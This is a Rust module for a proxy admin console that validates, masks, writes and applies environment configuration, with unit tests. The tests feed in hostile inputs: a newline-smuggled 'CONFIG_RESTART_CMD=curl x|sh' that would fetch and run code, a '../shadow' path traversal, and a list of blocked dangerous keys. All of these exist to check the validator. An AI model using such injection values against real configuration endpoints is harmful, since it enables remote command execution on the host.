//! Persist and apply operator configuration from the admin console.

use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use tokio::sync::watch;
use tracing::{info, warn};

/// Canonical Roskomnadzor dump mirror (GitHub raw URLs currently return 404).
pub const DEFAULT_RKN_SYNC_URL: &str = "https://svn.code.sf.net/p/zapret-info/code/dump.csv";

const ENV_HEADER: &str = "# Managed by BSDM Admin Console — do not edit while proxy is running\n";

/// Keys whose values are masked in GET /api/config responses.
const SECRET_MARKERS: &[&str] = &[
    "_TOKEN",
    "_PASSWORD",
    "_SECRET",
    "_KEY",
    "API_KEY",
    "BIND_PASSWORD",
    "CLIENT_SECRET",
];

/// Keys the Admin Console may change through `POST /api/config/apply`.
///
/// Strict allowlist of operational settings (the keys the console's
/// `collectConfig` produces). Deliberately absent: anything that executes or
/// loads code (`CONFIG_RESTART_CMD`, `WASM_*`, `LD_*`, `PATH`), relocates the
/// config/ACL files (`CONFIG_ENV_PATH`, `ACL_RULES_PATH`), changes trust
/// anchors or the deployment posture (`MITM_CA_DIR`, `UPSTREAM_CA_CERT`,
/// `DEPLOYMENT_PROFILE`, `ALLOW_FULL_MITM`, `POLICY_MODE`, `BLOCK_*`,
/// `CONTROL_API_*`) and every `*_TOKEN`. Also absent: destinations that would
/// receive decrypted traffic, credentials or telemetry (ICAP, LDAP, OIDC
/// issuer/secrets/redirects, Kafka, ClickHouse, Redis, webhooks, AI backends,
/// hierarchy peers, threat feeds, RKN, reverse-proxy upstream), listener binds, and the eBPF arming switch. Those stay
/// host-managed.
pub const CONSOLE_EDITABLE_KEYS: &[&str] = &[
    "HTTP_PORT",
    "METRICS_PORT",
    "RUST_LOG",
    "SHUTDOWN_TIMEOUT_SECONDS",
    "MAX_CACHE_BODY_SIZE",
    "MITM_ENABLED",
    "CACHE_CAPACITY",
    "CACHE_TTL_SECONDS",
    "CACHE_SHARDS",
    "CACHE_HONOR_CACHE_CONTROL",
    "NEGATIVE_CACHE_ENABLED",
    "NEGATIVE_CACHE_TTL_SECONDS",
    "CACHE_SPILL_THRESHOLD_BYTES",
    "WORKER_COUNT",
    "PERF_FAST_CACHE_HIT",
    "STREAMING_MISS_ENABLED",
    "KAFKA_SAMPLE_RATE",
    "METRICS_SAMPLE_RATE",
    "KAFKA_QUEUE_CAPACITY",
    "KAFKA_TOPIC",
    "KAFKA_ACKS",
    "KAFKA_BATCH_SIZE",
    "KAFKA_BATCH_TIMEOUT",
    "AUTH_ENABLED",
    "AUTH_BACKEND",
    "AUTH_REALM",
    "AUTH_CACHE_TTL",
    "ACL_ENABLED",
    "ACL_DEFAULT_ACTION",
    "ACL_AUTO_RELOAD",
    "ACL_RELOAD_INTERVAL",
    "CATEGORIZATION_ENABLED",
    "CATEGORIZATION_CACHE_TTL",
    "UT1_ENABLED",
    "UT1_PATH",
    "URLHAUS_ENABLED",
    "PHISHTANK_ENABLED",
    "CUSTOM_DB_ENABLED",
    "CUSTOM_DB_PATH",
    "CLICKHOUSE_DATABASE",
    "CLICKHOUSE_TABLE",
    "PROMETHEUS_ENABLED",
    "GRAFANA_ENABLED",
    "ICAP_ENABLED",
    "ICAP_FAIL_OPEN",
    "ICAP_REQMOD",
    "ICAP_RESPMOD",
    "ALERT_WORKER_ENABLED",
    "AI_CACHE_ENABLED",
    "RKN_SYNC_ENABLED",
    "DOH_ENABLED",
    "DOT_ENABLED",
    "LDAP_BASE_DN",
    "LDAP_USER_FILTER",
    "LDAP_USE_TLS",
    "NTLM_DOMAIN",
    "NTLM_WORKSTATION",
    "REDIS_L2_ENABLED",
    "REDIS_KEY_PREFIX",
    "UPSTREAM_HTTP2_ENABLED",
    "HTTP_PRESERVE_HEADER_CASE",
    "THREAT_SCORE_ENABLED",
    "THREAT_SCORE_POLL_INTERVAL_SECS",
    "THREAT_SCORE_BLOCK_THRESHOLD",
    "THREAT_SCORE_WARN_THRESHOLD",
    "ICP_SERVER_ENABLED",
    "HTCP_SERVER_ENABLED",
    "PEER_DISCOVERY_ENABLED",
    "RATE_LIMIT_ENABLED",
    "RATE_LIMIT_MAX_KEYS",
    "CONTROL_GRPC_ENABLED",
    "OIDC_SESSION_TTL_SECONDS",
    "OIDC_PROVIDERS",
    "OIDC_GOOGLE_CLIENT_ID",
    "OIDC_GOOGLE_ALLOWED_DOMAINS",
    "OIDC_APPLE_CLIENT_ID",
    "OIDC_APPLE_TEAM_ID",
    "OIDC_APPLE_KEY_ID",
    "OIDC_APPLE_PRIVATE_KEY_FILE",
    "OIDC_CORP_CLIENT_ID",
    "OIDC_CLIENT_ID",
];

/// Directories file-path settings may point into in production.
const PRODUCTION_CONFIG_DIRS: &[&str] = &["/etc/bsdm-proxy/", "/var/lib/bsdm-proxy/"];

fn is_path_key(key: &str) -> bool {
    key.ends_with("_PATH") || key.ends_with("_FILE") || key.ends_with("_DIR")
}

/// Validate a console config delta before anything is written. Rejects the
/// whole request (no partial apply) and names every offending key.
pub fn validate_console_env(env: &HashMap<String, String>, production: bool) -> Result<(), String> {
    let mut problems: Vec<String> = Vec::new();
    let mut keys: Vec<&String> = env.keys().collect();
    keys.sort();
    for key in keys {
        let value = &env[key];
        let well_formed = !key.is_empty()
            && key.bytes().next().is_some_and(|b| b.is_ascii_uppercase())
            && key
                .bytes()
                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_');
        if !well_formed {
            problems.push(format!("{key}: invalid key"));
            continue;
        }
        if !CONSOLE_EDITABLE_KEYS.contains(&key.as_str()) {
            problems.push(format!("{key}: not editable from the console"));
            continue;
        }
        // A newline would inject extra KEY=VALUE lines into the env file.
        if value.contains(['\r', '\n', '\0']) {
            problems.push(format!("{key}: value contains a control character"));
            continue;
        }
        // The file is read by systemd `EnvironmentFile`: a trailing `\` joins
        // the next line (swallowing a host-managed key), and quotes change
        // parsing. Values are written unquoted, so these are refused outright.
        if value.contains(['\\', '"', '\'']) || value.trim() != value {
            problems.push(format!(
                "{key}: value must not contain backslashes, quotes or surrounding whitespace"
            ));
            continue;
        }
        if production && is_path_key(key) && !value.is_empty() {
            let inside = PRODUCTION_CONFIG_DIRS.iter().any(|d| value.starts_with(d))
                && !value.split('/').any(|c| c == "..");
            if !inside {
                problems.push(format!(
                    "{key}: path must be under /etc/bsdm-proxy or /var/lib/bsdm-proxy"
                ));
            }
        }
    }
    if problems.is_empty() {
        Ok(())
    } else {
        Err(problems.join("; "))
    }
}

#[derive(Debug, Clone, Deserialize)]
pub struct ConfigApplyRequest {
    pub env: HashMap<String, String>,
    #[serde(default)]
    pub acl_rules: Option<serde_json::Value>,
    #[serde(default)]
    pub restart: Option<bool>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ConfigApplyResponse {
    pub status: &'static str,
    pub env_path: String,
    pub hot_reload: Vec<String>,
    pub restart: &'static str,
    pub message: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ConfigSnapshotResponse {
    pub env_path: String,
    pub env: BTreeMap<String, String>,
}

pub fn config_env_path() -> PathBuf {
    if let Ok(path) = std::env::var("CONFIG_ENV_PATH") {
        if !path.trim().is_empty() {
            return PathBuf::from(path);
        }
    }
    let etc = Path::new("/etc/bsdm-proxy/bsdm-proxy.env");
    if etc.is_file() {
        return etc.to_path_buf();
    }
    PathBuf::from("./bsdm-proxy.env")
}

pub fn parse_env_text(text: &str) -> HashMap<String, String> {
    let mut map = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let Some((key, value)) = trimmed.split_once('=') else {
            continue;
        };
        let key = key.trim();
        if key.is_empty() {
            continue;
        }
        map.insert(key.to_string(), value.to_string());
    }
    map
}

pub fn format_env_file(vars: &HashMap<String, String>) -> String {
    let mut keys: Vec<_> = vars.keys().collect();
    keys.sort();
    let mut out = String::from(ENV_HEADER);
    for key in keys {
        let value = &vars[key];
        if value.is_empty() {
            continue;
        }
        out.push_str(key);
        out.push('=');
        out.push_str(value);
        out.push('\n');
    }
    out
}

pub fn apply_env_map(vars: &HashMap<String, String>) {
    for (key, value) in vars {
        if value.is_empty() {
            std::env::remove_var(key);
        } else {
            std::env::set_var(key, value);
        }
    }
}

pub fn mask_secret_value(key: &str, value: &str) -> String {
    if is_secret_key(key) && !value.is_empty() {
        "***".to_string()
    } else {
        value.to_string()
    }
}

pub fn mask_env_map(vars: &HashMap<String, String>) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    for (key, value) in vars {
        out.insert(key.clone(), mask_secret_value(key, value));
    }
    out
}

fn is_secret_key(key: &str) -> bool {
    let upper = key.to_ascii_uppercase();
    SECRET_MARKERS.iter().any(|marker| upper.contains(marker))
}

pub fn read_env_file() -> Result<HashMap<String, String>, String> {
    let path = config_env_path();
    if !path.is_file() {
        return Ok(HashMap::new());
    }
    let content = std::fs::read_to_string(&path)
        .map_err(|e| format!("failed to read {}: {e}", path.display()))?;
    Ok(parse_env_text(&content))
}

pub fn write_env_file(vars: &HashMap<String, String>) -> Result<PathBuf, String> {
    let path = config_env_path();
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("failed to create {}: {e}", parent.display()))?;
        }
    }
    let content = format_env_file(vars);
    let tmp = path.with_extension("env.tmp");
    std::fs::write(&tmp, &content)
        .map_err(|e| format!("failed to write {}: {e}", tmp.display()))?;
    std::fs::rename(&tmp, &path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("failed to replace {}: {e}", path.display())
    })?;
    Ok(path)
}

pub fn write_acl_rules_file(path: &str, rules: &serde_json::Value) -> Result<(), String> {
    serde_json::from_value::<crate::acl_config::AclRulesDocument>(rules.clone())
        .map_err(|e| format!("invalid acl_rules payload: {e}"))?;
    let content = serde_json::to_string_pretty(rules)
        .map_err(|e| format!("failed to serialize acl_rules: {e}"))?;
    let path_buf = PathBuf::from(path);
    if let Some(parent) = path_buf.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("failed to create {}: {e}", parent.display()))?;
        }
    }
    let tmp = path_buf.with_extension("json.tmp");
    std::fs::write(&tmp, format!("{content}\n"))
        .map_err(|e| format!("failed to write {}: {e}", tmp.display()))?;
    std::fs::rename(&tmp, &path_buf).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("failed to replace {}: {e}", path_buf.display())
    })?;
    Ok(())
}

pub fn config_snapshot() -> Result<ConfigSnapshotResponse, String> {
    let path = config_env_path();
    let mut env = read_env_file()?;
    if env.is_empty() {
        env = snapshot_process_env();
    }
    Ok(ConfigSnapshotResponse {
        env_path: path.display().to_string(),
        env: mask_env_map(&env),
    })
}

fn snapshot_process_env() -> HashMap<String, String> {
    std::env::vars().collect()
}

/// Restart after a console apply.
///
/// `CONFIG_RESTART_CMD` is host-managed: the console cannot set it and the
/// process environment is no longer mutated at runtime, so this is always the
/// value the service was started with. In production without a restart
/// command the process just shuts down and the supervisor (systemd/k8s)
/// starts it again — self re-exec would be killed with the cgroup anyway.
pub fn schedule_service_restart(shutdown_tx: watch::Sender<bool>) {
    let production = crate::security_defaults::is_production_profile();
    tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_millis(750)).await;

        if let Ok(cmd) = std::env::var("CONFIG_RESTART_CMD") {
            if !cmd.trim().is_empty() {
                info!("Executing CONFIG_RESTART_CMD after config apply");
                match tokio::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .spawn()
                {
                    Ok(_) => {
                        let _ = shutdown_tx.send(true);
                        return;
                    }
                    Err(error) => warn!("CONFIG_RESTART_CMD failed: {error}"),
                }
            }
        }

        if production {
            info!("Config applied; shutting down for the service supervisor to restart");
            let _ = shutdown_tx.send(true);
            return;
        }

        if let Ok(exe) = std::env::current_exe() {
            let args: Vec<String> = std::env::args().skip(1).collect();
            match tokio::process::Command::new(exe).args(&args).spawn() {
                Ok(_) => {
                    info!("Spawned replacement proxy process after config apply");
                    let _ = shutdown_tx.send(true);
                    return;
                }
                Err(error) => warn!("Self-restart spawn failed: {error}"),
            }
        }

        warn!("Config applied; shutting down without replacement process");
        let _ = shutdown_tx.send(true);
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_and_format_env_roundtrip() {
        let text = "# comment\nHTTP_PORT=3128\n\nMETRICS_PORT=9090\n";
        let map = parse_env_text(text);
        assert_eq!(map.get("HTTP_PORT"), Some(&"3128".to_string()));
        let formatted = format_env_file(&map);
        assert!(formatted.contains("HTTP_PORT=3128"));
        assert!(formatted.contains("METRICS_PORT=9090"));
    }

    #[test]
    fn masks_secret_keys() {
        assert_eq!(
            mask_secret_value("CONTROL_API_TOKEN", "secret"),
            "***".to_string()
        );
        assert_eq!(mask_secret_value("HTTP_PORT", "3128"), "3128".to_string());
    }

    fn env(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn console_env_accepts_operational_keys() {
        let ok = env(&[
            ("HTTP_PORT", "3128"),
            ("CACHE_TTL_SECONDS", "60"),
            ("RUST_LOG", "info"),
        ]);
        assert!(validate_console_env(&ok, true).is_ok());
    }

    #[test]
    fn console_env_rejects_dangerous_keys() {
        for key in [
            "CONFIG_RESTART_CMD",
            "CONFIG_ENV_PATH",
            "ACL_RULES_PATH",
            "CONTROL_API_TOKEN",
            "CONTROL_API_ALLOW_INSECURE",
            "DEPLOYMENT_PROFILE",
            "ALLOW_FULL_MITM",
            "POLICY_MODE",
            "MITM_CA_DIR",
            "BLOCK_CLOUD_METADATA",
            "LD_PRELOAD",
            "PATH",
            "WASM_MODULE_PATH",
            "UPSTREAM_CA_CERT",
            "ICAP_URL",
            "LDAP_SERVERS",
            "OIDC_ISSUER_URL",
            "KAFKA_BROKERS",
            "RKN_SYNC_URL",
            "EBPF_XDP_ENABLED",
            "DOH_BIND",
            "REVERSE_PROXY_UPSTREAM",
            "REDIS_URL",
            "ALERT_WEBHOOK_URL",
            "OLLAMA_URL",
            "HIERARCHY_PEERS_PATH",
            "OIDC_REDIRECT_URI",
            "PHISHTANK_API_KEY",
            "lower_case",
            "BAD-KEY",
        ] {
            let err = validate_console_env(&env(&[(key, "x")]), false).unwrap_err();
            assert!(err.contains(key), "{key}: {err}");
        }
    }

    #[test]
    fn console_env_rejects_newline_injection() {
        let bad = env(&[("RUST_LOG", "info\nCONFIG_RESTART_CMD=curl x|sh")]);
        assert!(validate_console_env(&bad, false).is_err());
        assert!(validate_console_env(&env(&[("RUST_LOG", "a\rb")]), false).is_err());
        assert!(validate_console_env(&env(&[("RUST_LOG", "a\0b")]), false).is_err());
    }

    #[test]
    fn console_env_rejects_systemd_line_continuation_and_quotes() {
        for value in ["http://x\\", "a\"b", "a'b", " lead", "trail "] {
            let bad = env(&[("ICAP_FAIL_OPEN", value)]);
            assert!(validate_console_env(&bad, false).is_err(), "{value:?}");
        }
        // Accepted values round-trip without touching neighbouring keys.
        let ok = env(&[
            ("URLHAUS_ENABLED", "true"),
            ("RUST_LOG", "info,proxy=debug"),
        ]);
        assert!(validate_console_env(&ok, true).is_ok());
        let mut file = ok.clone();
        file.insert("CONTROL_API_TOKEN".into(), "secret".into());
        let parsed = parse_env_text(&format_env_file(&file));
        assert_eq!(parsed, file);
    }

    #[test]
    fn console_env_restricts_paths_in_production() {
        let outside = env(&[("UT1_PATH", "/tmp/evil")]);
        assert!(CONSOLE_EDITABLE_KEYS.contains(&"UT1_PATH"));
        assert!(validate_console_env(&outside, true).is_err());
        assert!(validate_console_env(&outside, false).is_ok());
        let traversal = env(&[("UT1_PATH", "/etc/bsdm-proxy/../shadow")]);
        assert!(validate_console_env(&traversal, true).is_err());
        let inside = env(&[("UT1_PATH", "/var/lib/bsdm-proxy/ut1")]);
        assert!(validate_console_env(&inside, true).is_ok());
    }

    #[test]
    fn default_rkn_url_is_sf_mirror() {
        assert!(DEFAULT_RKN_SYNC_URL.contains("sf.net"));
    }
}
